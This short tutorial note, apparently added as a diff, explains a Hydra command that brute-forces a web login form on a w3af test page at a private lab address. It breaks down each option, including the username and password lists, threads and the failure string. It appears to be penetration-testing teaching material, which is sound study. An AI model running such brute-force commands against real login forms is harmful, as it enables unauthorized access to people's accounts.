@@ -1,0 +1,19 @@
+Hydra brute-force attack as follows:
+
+hydra 192.168.1.69 http-form-post "/w3af/bruteforce/form_login/dataReceptor.php:user=^USER^&pass=^PASS^:Bad login" -L users.txt -P pass.txt -t 10 -w 30 -o hydra-http-post-attack.txt
+                         // or get
+
+If we break this up
+
+Host = 192.168.1.69
+Method = http-form-post
+URL = /w3af/bruteforce/form_login/dataReceptor.php
+Form parameters = user=^USER^&pass=^PASS^
+Failure response = Bad login
+Users file = users.txt
+Password file = pass.txt
+Threads = -t 10
+Wait for timeout = -w 30
+Output file = -o hydra-http-post-attack.txt
+
+Hydra basically iterates through all the username/password combinations, until it gets a response that does not contain the text "Bad login".
